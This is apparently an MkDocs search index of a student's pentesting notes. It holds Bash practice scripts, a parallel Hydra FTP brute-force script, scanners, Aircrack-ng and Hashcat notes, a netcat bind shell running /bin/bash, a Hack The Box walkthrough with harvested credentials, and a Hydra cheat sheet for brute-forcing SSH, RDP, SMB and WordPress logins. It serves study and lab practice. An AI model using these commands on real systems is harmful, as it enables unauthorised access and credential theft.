{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to MkDocs For full documentation visit mkdocs.org . Commands mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Home"},{"location":"#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"bash/","text":"Bash Welcome to the Bash section. Here are the available scripts: arrays.sh #!/bin/bash # transport=('car' 'train' 'bike' 'bus') echo \"${transport[@]}\" echo \"${transport[1]}\" unset transport[1] echo \"${transport[@]}\" transport[1]='trainride' echo \"${transport[@]}\" cars=('honda' 'audi' 'bmw' 'tesla') echo \"${cars[@]}\" echo \"${cars[2]}\" conditionals.sh count=10 if [ $count -eq 10 ] then echo \"true\" else echo \"false\" fi value=\"guessme\" guess=$1 if [ \"value\" = \"$guess\" ] then echo \"they are equal\" else echo \"they are not equal\" fi conditionalsv2.sh #!/bin/bash # # filename=$1 if [ -f \"$filename\" ] && [ -w \"filename\" ] then echo \"Hello\" >$filename else touch \"$filename\" echo \"Hello\" > $filename fi hydraBruteFast.sh #!/bin/bash # Target FTP server IP address FTP_SERVER=\"10.129.158.92\" # Path to the username and password lists USERNAME_LIST=\"/usr/share/seclists/Usernames/cirt-default-usernames.txt\" PASSWORD_LIST=\"/usr/share/seclists/Passwords/cirt-default-passwords.txt\" # Check if the username and password files exist if [ ! -f \"$USERNAME_LIST\" ]; then echo \"Error: Username file '$USERNAME_LIST' not found.\" exit 1 fi if [ ! -f \"$PASSWORD_LIST\" ]; then echo \"Error: Password file '$PASSWORD_LIST' not found.\" exit 1 fi # Determine the number of CPU cores NUM_CORES=$(nproc) NUM_WORKERS=$((NUM_CORES * 4)) # Example: Use 4 times the number of CPU cores # Array to store background process IDs declare -a PID_ARRAY=() # Loop through each worker for ((i=0; i<$NUM_WORKERS; i++)) do # Execute Hydra with the username and password lists hydra -F -q -L \"$USERNAME_LIST\" -P \"$PASSWORD_LIST\" ftp://$FTP_SERVER & # Store the process ID (PID) of each Hydra instance in the array PID_ARRAY+=($!) done # Wait for all workers to complete for pid in \"${PID_ARRAY[@]}\" do wait $pid done echo \"Brute-force attack completed.\" parameters.sh #!/bin/bash echo Enter your name read name echo \"Your name is $name\" PingSweep.sh #!/bin/bash # Check if the correct number of arguments is provided if [ $# -ne 1 ]; then echo \"Usage: $0 <network_prefix>\" exit 1 fi # Loop over the IP addresses in the range 1 to 254 for ip in $(seq 1 254); do # Execute ping command in background ping -c 1 \"$1.$ip\" | grep -q \"bytes from\" && echo \"$1.$ip\" & done pingsweepnoip.sh #!/bin/bash # Function to extract network prefix from IP address get_network_prefix() { local ip=\"$1\" echo \"${ip%.*}\" } # Get the IP address of the host ip_address=$(hostname -I | awk '{print $1}') # Check if an IP address is obtained if [ -z \"$ip_address\" ]; then echo \"Failed to retrieve IP address. Please check your network connection.\" exit 1 fi # Extract the network prefix network_prefix=$(get_network_prefix \"$ip_address\") # Print the network prefix echo \"Network prefix: $network_prefix\" # Function to perform ping sweep for a given IP address ping_sweep() { local ip=\"$1\" ping -c 1 -w 1 \"$ip\" >/dev/null 2>&1 && echo \"$ip\" } # Loop over the IP addresses in the range 1 to 254 for ip in $(seq 1 254); do # Execute ping_sweep function in background ping_sweep \"$network_prefix.$ip\" & done practice.sh #!/bin/bash echo \"Hello World!\" ls -l ~/Desktop whoami id name=\"jammy\" echo $name SoundAtInterval.sh !#/bin/bash #forloop for i in {1..5} do echo wakeup do pushups! paplay /home/orca/Downloads/beep.mp3 sleep 3 done","title":"Bash"},{"location":"bash/#bash","text":"Welcome to the Bash section. Here are the available scripts:","title":"Bash"},{"location":"bash/#arrayssh","text":"#!/bin/bash # transport=('car' 'train' 'bike' 'bus') echo \"${transport[@]}\" echo \"${transport[1]}\" unset transport[1] echo \"${transport[@]}\" transport[1]='trainride' echo \"${transport[@]}\" cars=('honda' 'audi' 'bmw' 'tesla') echo \"${cars[@]}\" echo \"${cars[2]}\"","title":"arrays.sh"},{"location":"bash/#conditionalssh","text":"count=10 if [ $count -eq 10 ] then echo \"true\" else echo \"false\" fi value=\"guessme\" guess=$1 if [ \"value\" = \"$guess\" ] then echo \"they are equal\" else echo \"they are not equal\" fi","title":"conditionals.sh"},{"location":"bash/#conditionalsv2sh","text":"#!/bin/bash # # filename=$1 if [ -f \"$filename\" ] && [ -w \"filename\" ] then echo \"Hello\" >$filename else touch \"$filename\" echo \"Hello\" > $filename fi","title":"conditionalsv2.sh"},{"location":"bash/#hydrabrutefastsh","text":"#!/bin/bash # Target FTP server IP address FTP_SERVER=\"10.129.158.92\" # Path to the username and password lists USERNAME_LIST=\"/usr/share/seclists/Usernames/cirt-default-usernames.txt\" PASSWORD_LIST=\"/usr/share/seclists/Passwords/cirt-default-passwords.txt\" # Check if the username and password files exist if [ ! -f \"$USERNAME_LIST\" ]; then echo \"Error: Username file '$USERNAME_LIST' not found.\" exit 1 fi if [ ! -f \"$PASSWORD_LIST\" ]; then echo \"Error: Password file '$PASSWORD_LIST' not found.\" exit 1 fi # Determine the number of CPU cores NUM_CORES=$(nproc) NUM_WORKERS=$((NUM_CORES * 4)) # Example: Use 4 times the number of CPU cores # Array to store background process IDs declare -a PID_ARRAY=() # Loop through each worker for ((i=0; i<$NUM_WORKERS; i++)) do # Execute Hydra with the username and password lists hydra -F -q -L \"$USERNAME_LIST\" -P \"$PASSWORD_LIST\" ftp://$FTP_SERVER & # Store the process ID (PID) of each Hydra instance in the array PID_ARRAY+=($!) done # Wait for all workers to complete for pid in \"${PID_ARRAY[@]}\" do wait $pid done echo \"Brute-force attack completed.\"","title":"hydraBruteFast.sh"},{"location":"bash/#parameterssh","text":"#!/bin/bash echo Enter your name read name echo \"Your name is $name\"","title":"parameters.sh"},{"location":"bash/#pingsweepsh","text":"#!/bin/bash # Check if the correct number of arguments is provided if [ $# -ne 1 ]; then echo \"Usage: $0 <network_prefix>\" exit 1 fi # Loop over the IP addresses in the range 1 to 254 for ip in $(seq 1 254); do # Execute ping command in background ping -c 1 \"$1.$ip\" | grep -q \"bytes from\" && echo \"$1.$ip\" & done","title":"PingSweep.sh"},{"location":"bash/#pingsweepnoipsh","text":"#!/bin/bash # Function to extract network prefix from IP address get_network_prefix() { local ip=\"$1\" echo \"${ip%.*}\" } # Get the IP address of the host ip_address=$(hostname -I | awk '{print $1}') # Check if an IP address is obtained if [ -z \"$ip_address\" ]; then echo \"Failed to retrieve IP address. Please check your network connection.\" exit 1 fi # Extract the network prefix network_prefix=$(get_network_prefix \"$ip_address\") # Print the network prefix echo \"Network prefix: $network_prefix\" # Function to perform ping sweep for a given IP address ping_sweep() { local ip=\"$1\" ping -c 1 -w 1 \"$ip\" >/dev/null 2>&1 && echo \"$ip\" } # Loop over the IP addresses in the range 1 to 254 for ip in $(seq 1 254); do # Execute ping_sweep function in background ping_sweep \"$network_prefix.$ip\" & done","title":"pingsweepnoip.sh"},{"location":"bash/#practicesh","text":"#!/bin/bash echo \"Hello World!\" ls -l ~/Desktop whoami id name=\"jammy\" echo $name","title":"practice.sh"},{"location":"bash/#soundatintervalsh","text":"!#/bin/bash #forloop for i in {1..5} do echo wakeup do pushups! paplay /home/orca/Downloads/beep.mp3 sleep 3 done","title":"SoundAtInterval.sh"},{"location":"markdown/","text":"Markdown Welcome to the Markdown section. Here are the available scripts: Aircrack-ng Suite Bind Shell Reverse Shell decryptpractice Easy Webserver setup enumeration tecniques ferxobuster github test for markdown Hashcat Notes How to setup a webserver with python HTB Crocodile Walkthrough Hydra Notes NMAP Notes normcap Notes(from winOS) Notes PacketCaptureVPNkeyFind Pentesting Online Tools Pentesting Tools portsweepwithservice.py import sys import socket import multiprocessing # Function to scan ports def scan_port(target, port): try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(1) # Set a timeout of 1 second result = s.connect_ex((target, port)) if result == 0: service = socket.getservbyport(port) print(\"Port {} ({}) is open\".format(port, service)) s.close() except KeyboardInterrupt: print(\"\\n Exiting\") sys.exit() except socket.gaierror: print(\"\\n Hostname could not be resolved\") sys.exit() except socket.error: print(\"\\n Server not responding\") sys.exit() if __name__ == \"__main__\": if len(sys.argv) == 2: target = socket.gethostbyname(sys.argv[1]) else: target = input(\"Enter target IP address or hostname: \") # Create multiprocessing pool pool = multiprocessing.Pool() # Scan ports using multiprocessing pool results = [] for port in range(1, 65536): # Scan ports from 1 to 65535 results.append(pool.apply_async(scan_port, args=(target, port))) # Close the pool and wait for all processes to complete pool.close() pool.join() # Get results from the multiprocessing pool for result in results: result.get() Privilege Escalation using text editors rot13practice.sh !#/bin/bash echo \"Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi\" | tr `[A-Za-z]' '[N-ZA-Mn-za-m]' ShellUpgrade Steghide The Metasploit Framework theHarvesterNotes THM Easy CTF TryHackMeBlueWalkThrough TryHackMe_Fawn_Walkthrough Week One Python CODE CYSE 250__","title":"Markdown"},{"location":"markdown/#markdown","text":"Welcome to the Markdown section. Here are the available scripts: Aircrack-ng Suite Bind Shell Reverse Shell decryptpractice Easy Webserver setup enumeration tecniques ferxobuster github test for markdown Hashcat Notes How to setup a webserver with python HTB Crocodile Walkthrough Hydra Notes NMAP Notes normcap Notes(from winOS) Notes PacketCaptureVPNkeyFind Pentesting Online Tools Pentesting Tools","title":"Markdown"},{"location":"markdown/#portsweepwithservicepy","text":"import sys import socket import multiprocessing # Function to scan ports def scan_port(target, port): try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(1) # Set a timeout of 1 second result = s.connect_ex((target, port)) if result == 0: service = socket.getservbyport(port) print(\"Port {} ({}) is open\".format(port, service)) s.close() except KeyboardInterrupt: print(\"\\n Exiting\") sys.exit() except socket.gaierror: print(\"\\n Hostname could not be resolved\") sys.exit() except socket.error: print(\"\\n Server not responding\") sys.exit() if __name__ == \"__main__\": if len(sys.argv) == 2: target = socket.gethostbyname(sys.argv[1]) else: target = input(\"Enter target IP address or hostname: \") # Create multiprocessing pool pool = multiprocessing.Pool() # Scan ports using multiprocessing pool results = [] for port in range(1, 65536): # Scan ports from 1 to 65535 results.append(pool.apply_async(scan_port, args=(target, port))) # Close the pool and wait for all processes to complete pool.close() pool.join() # Get results from the multiprocessing pool for result in results: result.get() Privilege Escalation using text editors","title":"portsweepwithservice.py"},{"location":"markdown/#rot13practicesh","text":"!#/bin/bash echo \"Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi\" | tr `[A-Za-z]' '[N-ZA-Mn-za-m]' ShellUpgrade Steghide The Metasploit Framework theHarvesterNotes THM Easy CTF TryHackMeBlueWalkThrough TryHackMe_Fawn_Walkthrough Week One Python CODE CYSE 250__","title":"rot13practice.sh"},{"location":"markdown/Aircrack-ng%20Suite/","text":"Aircrack-ng Suite The Aircrack-ng suite of tools is built for assessing the network security of wireless networks. It has tools for monitoring, attacking, testing, and cracking wifi communications. All of the tools in the suite are command line tools, which allows for their use in scripts. Many other programs that use the suite take advantage of this fact. The suite primarily runs on Linux, but technically can run on most operating systems, though running on Windows has very little support. The tools in the aircrack-ng suite are stored in a couple different directories on Kali. Tools stored in */usr/sbin generally require you to be root user in order to run. * ls -l /usr/sbin/air* The following three tools are most commonly used to capture and manipulate Wi-Fi traffic: airmon-ng - enables and disables monitor mode on a wireless interface. airodump-ng - provides the ability to capture 802.11 frames. aireplay-ng - injects frames to perform an attack to obtain the authentication credentials for an access point. ls -l /usr/bin/air* The aircrack-ng tools found in the /usr/bin can generally be run by any user. They are used to decode frames recovered via airmon-ng and airdump-ng: aircrack-ng - attempts to recover the passphrase from a packet capture via an offline dictionary attack. airdecap-ng - decrypt captured frames once the passphrase has been recovered. To find out more about the options and usage of an individual tool within the suite, simply add either --help or -h to the end of the tool name for help. Some commands only take --help and others only -h, but it should be noted that usually just typing the name of the command by itself will also show the help and usage information. Setting up Aircrack-ng Before using aircrack-ng in the real world: Ensure the wireless adapter is supported and compatible. Identify the manufacturer of the wireless card and the chipset manufacturer. Determining the correct chipset of your wireless card can be a challenge. You have a number of options: Search the Internet for the card model to find the chipset. Search the forums at the official aircrack-ng website at: https://forum.aircrack-ng.org/ If the card is working on your Windows system, you may be able to determine the chipset by looking at the Windows driver filenames. Check the card manufacturer's website. If the card is working on a Linux system, you may be able to use either of the lsusb -vv or lspci -vv commands. Locate the FCC ID of your device and search https://www.fcc.gov/oet/ea/fccid for your card. Next, identify the driver needed for the card. There are different drivers available. To work with the aircrack-ng suite you must be able to put the wireless card in what is called monitor mode. You can find more information and an example of the monitor mode process at: https://www.aircrack-ng.org/doku.php?id=compatibility_drivers If you are planning to purchase a card to work with the aircrack-ng suite, see: https://www.aircrack-ng.org/doku.php?id=faq#what_is_the_best_wireless_card_to_buy To ensure that the card chipset can operate in monitor mode and set up the appropriate driver, use the airmon-ng tool and its options. Airmon-ng returns an error and does not display any info as we do not have a virtual wireless card in the environment. However, there are certain processes which can also interfere with airmon-ng, so there is an option to test for this. Type: * airmon-ng check Airmon-ng notes one process which could cause problems and indicates that to kill this process you would type airmon-ng check kill, use the following command to put the wireless card in monitor mode to work with other parts of the suite. * airmon-ng start <your wirelesscard interface> 6 To later disable monitor mode and return the card to managed mode, use the following command: * airmon-ng stop <your wirelesscard interface>mon Note the name of the monitoring interface is the default interface name with mon appended to the end, the name used to stop monitoring mode. Once you have a compatible card and driver, you can place your card in monitor mode and work with other tools in the aircrack-ng suite. Using Aircrack-ng Tools Let's take a look at other aircrack-ng suite tools. We will use the wireless traffic sample capture files from aircrack-ng and the suite of tools to analyze and crack the capture files. airodump-ng can capture wireless network traffic passwords and usernames. We will use this tool to attempt to crack wifi passwords. captures files can be opened by programs such as tcpdump and Wireshark, but we will use air-crack-ng to see if we can crack the wifi password. we'll use this command: * aircrack-ng -w password.lst <capture.cap>","title":"Aircrack ng Suite"},{"location":"markdown/Aircrack-ng%20Suite/#aircrack-ng-suite","text":"The Aircrack-ng suite of tools is built for assessing the network security of wireless networks. It has tools for monitoring, attacking, testing, and cracking wifi communications. All of the tools in the suite are command line tools, which allows for their use in scripts. Many other programs that use the suite take advantage of this fact. The suite primarily runs on Linux, but technically can run on most operating systems, though running on Windows has very little support. The tools in the aircrack-ng suite are stored in a couple different directories on Kali. Tools stored in */usr/sbin generally require you to be root user in order to run. * ls -l /usr/sbin/air* The following three tools are most commonly used to capture and manipulate Wi-Fi traffic: airmon-ng - enables and disables monitor mode on a wireless interface. airodump-ng - provides the ability to capture 802.11 frames. aireplay-ng - injects frames to perform an attack to obtain the authentication credentials for an access point. ls -l /usr/bin/air* The aircrack-ng tools found in the /usr/bin can generally be run by any user. They are used to decode frames recovered via airmon-ng and airdump-ng: aircrack-ng - attempts to recover the passphrase from a packet capture via an offline dictionary attack. airdecap-ng - decrypt captured frames once the passphrase has been recovered. To find out more about the options and usage of an individual tool within the suite, simply add either --help or -h to the end of the tool name for help. Some commands only take --help and others only -h, but it should be noted that usually just typing the name of the command by itself will also show the help and usage information.","title":"Aircrack-ng Suite"},{"location":"markdown/Aircrack-ng%20Suite/#setting-up-aircrack-ng","text":"Before using aircrack-ng in the real world: Ensure the wireless adapter is supported and compatible. Identify the manufacturer of the wireless card and the chipset manufacturer. Determining the correct chipset of your wireless card can be a challenge. You have a number of options: Search the Internet for the card model to find the chipset. Search the forums at the official aircrack-ng website at: https://forum.aircrack-ng.org/ If the card is working on your Windows system, you may be able to determine the chipset by looking at the Windows driver filenames. Check the card manufacturer's website. If the card is working on a Linux system, you may be able to use either of the lsusb -vv or lspci -vv commands. Locate the FCC ID of your device and search https://www.fcc.gov/oet/ea/fccid for your card. Next, identify the driver needed for the card. There are different drivers available. To work with the aircrack-ng suite you must be able to put the wireless card in what is called monitor mode. You can find more information and an example of the monitor mode process at: https://www.aircrack-ng.org/doku.php?id=compatibility_drivers If you are planning to purchase a card to work with the aircrack-ng suite, see: https://www.aircrack-ng.org/doku.php?id=faq#what_is_the_best_wireless_card_to_buy To ensure that the card chipset can operate in monitor mode and set up the appropriate driver, use the airmon-ng tool and its options. Airmon-ng returns an error and does not display any info as we do not have a virtual wireless card in the environment. However, there are certain processes which can also interfere with airmon-ng, so there is an option to test for this. Type: * airmon-ng check Airmon-ng notes one process which could cause problems and indicates that to kill this process you would type airmon-ng check kill, use the following command to put the wireless card in monitor mode to work with other parts of the suite. * airmon-ng start <your wirelesscard interface> 6 To later disable monitor mode and return the card to managed mode, use the following command: * airmon-ng stop <your wirelesscard interface>mon Note the name of the monitoring interface is the default interface name with mon appended to the end, the name used to stop monitoring mode. Once you have a compatible card and driver, you can place your card in monitor mode and work with other tools in the aircrack-ng suite.","title":"Setting up Aircrack-ng"},{"location":"markdown/Aircrack-ng%20Suite/#using-aircrack-ng-tools","text":"Let's take a look at other aircrack-ng suite tools. We will use the wireless traffic sample capture files from aircrack-ng and the suite of tools to analyze and crack the capture files. airodump-ng can capture wireless network traffic passwords and usernames. We will use this tool to attempt to crack wifi passwords. captures files can be opened by programs such as tcpdump and Wireshark, but we will use air-crack-ng to see if we can crack the wifi password. we'll use this command: * aircrack-ng -w password.lst <capture.cap>","title":"Using Aircrack-ng Tools"},{"location":"markdown/Bind%20Shell%20Reverse%20Shell/","text":"This is how to setup a bind/reverse shell listener Bind Shell set's up listener on victim Listener: nc -lvp 9001 -e /bin/bash * The above command will setup a listener on victim computer how to connect to lisenter nc 0.0.0.0. 9001 Reverseshell set's up listener on attacker","title":"Bind Shell Reverse Shell"},{"location":"markdown/Bind%20Shell%20Reverse%20Shell/#this-is-how-to-setup-a-bindreverse-shell-listener","text":"","title":"This is how to setup a bind/reverse shell listener"},{"location":"markdown/Bind%20Shell%20Reverse%20Shell/#bind-shell","text":"set's up listener on victim Listener: nc -lvp 9001 -e /bin/bash * The above command will setup a listener on victim computer how to connect to lisenter nc 0.0.0.0. 9001","title":"Bind Shell"},{"location":"markdown/Bind%20Shell%20Reverse%20Shell/#reverseshell","text":"set's up listener on attacker","title":"Reverseshell"},{"location":"markdown/Easy%20Webserver%20setup/","text":"Easy Webserver setup python3 -m http.server 9001","title":"Easy Webserver setup"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/","text":"HTB Crocodile Walkthrough Recon Spawned Targed ID 10.129.184.140 Run a nmap scan against target * sudo nmap -sV -O 10.129.184.140 Task 1 What Nmap scanning switch employs the use of default scripts during a scan? -sC Scan results Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 53/tcp filtered domain 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Task 2 What service version is found to be running on port 21? vsftpd 3.0.3 To login to the FTP server: Anonymous Login is enabled type this command to ftp into 10.129.184.140 * ftp 10.129.184.140 Then login in with: * anonymous Task 3 What FTP code is returned to us for the \"Anonymous FTP login allowed\" message? 230 Task 4 After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? anonymous Task 5 After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? get After FTP login into server 10.129.184.140 run command to show directories * ls you will see two directories, which we download. allowed.userlist allowed.userlist.passwd be aware of where you are were you are downloading these files and run the get command to retrieve file: * get allowed.userlist * get allowed.userlist.passwd Task 6 What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? admin Task 7 What version of Apache HTTP Server is running on the target host? (refer to previous nmap scan results helpful switch -sV) Apache httpd 2.4.41 Task 8 What switch can we use with Gobuster to specify we are looking for specific filetypes? -x Task 9 Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? For this task we need to run gobuster or feroxbuster to disover some sort of login page. Utilizing feroxbuster run this command: * feroxbuster -u http://10.129.184.140 --extensions \"php.txt\" this came back with these directories availble for traversal http://10.129.184.140/assets/js/vendor/ http://10.129.184.140/assets/images/portfolio/ http://10.129.184.140/js/ http://10.129.184.140/css/ http://10.129.184.140/assets/js/ http://10.129.184.140/assets/images/slider/ http://10.129.184.140/assets/ http://10.129.184.140/assets/css/ http://10.129.184.140/assets/images/ http://10.129.184.140/assets/fonts/ http://10.129.184.140/fonts/ http://10.129.184.140/dashboard/ for this we will select the dashboard directory in hopes for a login page. which it did redirect \"login.php the answer for Task 9 is: login.php from here we will login using the credentials harvested from the FTP server files we download. username: admin passwd: rKXM59ESxesUFHAd once logged in you'll see the root flag on the page c7110277ac44d78b6a9fff2232434d16","title":"HTB Crocodile Walkthrough"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#htb-crocodile-walkthrough","text":"","title":"HTB Crocodile Walkthrough"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#recon","text":"Spawned Targed ID 10.129.184.140 Run a nmap scan against target * sudo nmap -sV -O 10.129.184.140","title":"Recon"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-1","text":"What Nmap scanning switch employs the use of default scripts during a scan? -sC","title":"Task 1"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#scan-results","text":"Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 53/tcp filtered domain 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))","title":"Scan results"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-2","text":"What service version is found to be running on port 21? vsftpd 3.0.3 To login to the FTP server: Anonymous Login is enabled type this command to ftp into 10.129.184.140 * ftp 10.129.184.140 Then login in with: * anonymous","title":"Task 2"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-3","text":"What FTP code is returned to us for the \"Anonymous FTP login allowed\" message? 230","title":"Task 3"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-4","text":"After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? anonymous","title":"Task 4"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-5","text":"After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? get After FTP login into server 10.129.184.140 run command to show directories * ls you will see two directories, which we download. allowed.userlist allowed.userlist.passwd be aware of where you are were you are downloading these files and run the get command to retrieve file: * get allowed.userlist * get allowed.userlist.passwd","title":"Task 5"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-6","text":"What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? admin","title":"Task 6"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-7","text":"What version of Apache HTTP Server is running on the target host? (refer to previous nmap scan results helpful switch -sV) Apache httpd 2.4.41","title":"Task 7"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-8","text":"What switch can we use with Gobuster to specify we are looking for specific filetypes? -x","title":"Task 8"},{"location":"markdown/HTB%20Crocodile%20Walkthrough/#task-9","text":"Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? For this task we need to run gobuster or feroxbuster to disover some sort of login page. Utilizing feroxbuster run this command: * feroxbuster -u http://10.129.184.140 --extensions \"php.txt\" this came back with these directories availble for traversal http://10.129.184.140/assets/js/vendor/ http://10.129.184.140/assets/images/portfolio/ http://10.129.184.140/js/ http://10.129.184.140/css/ http://10.129.184.140/assets/js/ http://10.129.184.140/assets/images/slider/ http://10.129.184.140/assets/ http://10.129.184.140/assets/css/ http://10.129.184.140/assets/images/ http://10.129.184.140/assets/fonts/ http://10.129.184.140/fonts/ http://10.129.184.140/dashboard/ for this we will select the dashboard directory in hopes for a login page. which it did redirect \"login.php the answer for Task 9 is: login.php from here we will login using the credentials harvested from the FTP server files we download. username: admin passwd: rKXM59ESxesUFHAd once logged in you'll see the root flag on the page c7110277ac44d78b6a9fff2232434d16","title":"Task 9"},{"location":"markdown/Hashcat%20Notes/","text":"Hashcat Notes basic hash crack command would look like this hashcat -m100 -a 0 password.txt /usr/share/seclists/Passwords/cirt-default-passwords.txt The above command is example of trying to crack a password in password.txt by chacking it against the cirt-default-passwords.txt if you are do crack the password it will write to a file call hashcat.potfile located in here: ~/.local/share/hashcat/hashcat.potfile","title":"Hashcat Notes"},{"location":"markdown/Hashcat%20Notes/#hashcat-notes","text":"basic hash crack command would look like this hashcat -m100 -a 0 password.txt /usr/share/seclists/Passwords/cirt-default-passwords.txt The above command is example of trying to crack a password in password.txt by chacking it against the cirt-default-passwords.txt if you are do crack the password it will write to a file call hashcat.potfile located in here: ~/.local/share/hashcat/hashcat.potfile","title":"Hashcat Notes"},{"location":"markdown/How%20to%20setup%20a%20webserver%20with%20python/","text":"How to setup a webserver with python python3 -m http.server 9001 transfering file cheatsheet https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/","title":"How to setup a webserver with python"},{"location":"markdown/How%20to%20setup%20a%20webserver%20with%20python/#how-to-setup-a-webserver-with-python","text":"python3 -m http.server 9001","title":"How to setup a webserver with python"},{"location":"markdown/How%20to%20setup%20a%20webserver%20with%20python/#transfering-file-cheatsheet","text":"https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/","title":"transfering file cheatsheet"},{"location":"markdown/Hydra%20Notes/","text":"Hydra Notes Basic hydra command this command must be edited to fit the paramaters of the login page. it's just a basic layout of the command. hydra 192.168.1.150 -l admin -P \u2018pass.txt\u2019 http-get-form \u201c/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low\u201d A Detailed Guide on Hydra Targeted combinations If we have a list of usernames and passwords, we can implement a dictionary attack. But if we have more information on which usernames are likely to have a set of passwords, we can prepare a custom list for Hydra. For example, we can create a list of usernames and passwords separated by semicolons like the one below. username1:password1 username2:password2 username3:password3 We can then use the -C flag to tell Hydra to run these specific combinations instead of looping through all the users and passwords. This drastically reduces the time taken to complete a brute-force attack. Here is the syntax. hydra -C <combinations.txt> <ip> <service> Hydra Password Cracking Cheetsheet The following table uses the $ip variable which can be set with the following command: export ip 10.10.10.1 Command Description hydra -P password-file.txt -v $ip snmp Hydra brute force against SNMP hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp Hydra FTP known user and rockyou password list hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh Hydra SSH using list of users and passwords hydra -v -V -u -L users.txt -p \"\" -t 1 -u $ip ssh Hydra SSH using a known password and a username list hydra $ip -s 22 ssh -l -P big_wordlist.txt Hydra SSH Against Known username on port 22 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V Hydra POP3 Brute Force hydra -P /usr/share/wordlists/nmap.lst $ip smtp -V Hydra SMTP Brute Force hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin Hydra attack http get 401 login with a dictionary hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip Hydra attack Windows Remote Desktop with rockyou hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb Hydra brute force SMB user with rockyou hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' Hydra brute force a Wordpress admin login hydra -L usernames.txt -P passwords.txt $ip smb -V -f SMB Brute Forcing hydra -L users.txt -P passwords.txt $ip ldap2 -V -f LDAP Brute Forcing","title":"Hydra Notes"},{"location":"markdown/Hydra%20Notes/#hydra-notes","text":"","title":"Hydra Notes"},{"location":"markdown/Hydra%20Notes/#basic-hydra-command","text":"this command must be edited to fit the paramaters of the login page. it's just a basic layout of the command. hydra 192.168.1.150 -l admin -P \u2018pass.txt\u2019 http-get-form \u201c/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low\u201d","title":"Basic hydra command"},{"location":"markdown/Hydra%20Notes/#a-detailed-guide-on-hydra","text":"Targeted combinations If we have a list of usernames and passwords, we can implement a dictionary attack. But if we have more information on which usernames are likely to have a set of passwords, we can prepare a custom list for Hydra. For example, we can create a list of usernames and passwords separated by semicolons like the one below. username1:password1 username2:password2 username3:password3 We can then use the -C flag to tell Hydra to run these specific combinations instead of looping through all the users and passwords. This drastically reduces the time taken to complete a brute-force attack. Here is the syntax. hydra -C <combinations.txt> <ip> <service>","title":"A Detailed Guide on Hydra"},{"location":"markdown/Hydra%20Notes/#hydra-password-cracking-cheetsheet","text":"The following table uses the $ip variable which can be set with the following command: export ip 10.10.10.1 Command Description hydra -P password-file.txt -v $ip snmp Hydra brute force against SNMP hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp Hydra FTP known user and rockyou password list hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh Hydra SSH using list of users and passwords hydra -v -V -u -L users.txt -p \"\" -t 1 -u $ip ssh Hydra SSH using a known password and a username list hydra $ip -s 22 ssh -l -P big_wordlist.txt Hydra SSH Against Known username on port 22 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V Hydra POP3 Brute Force hydra -P /usr/share/wordlists/nmap.lst $ip smtp -V Hydra SMTP Brute Force hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin Hydra attack http get 401 login with a dictionary hydra -t 1 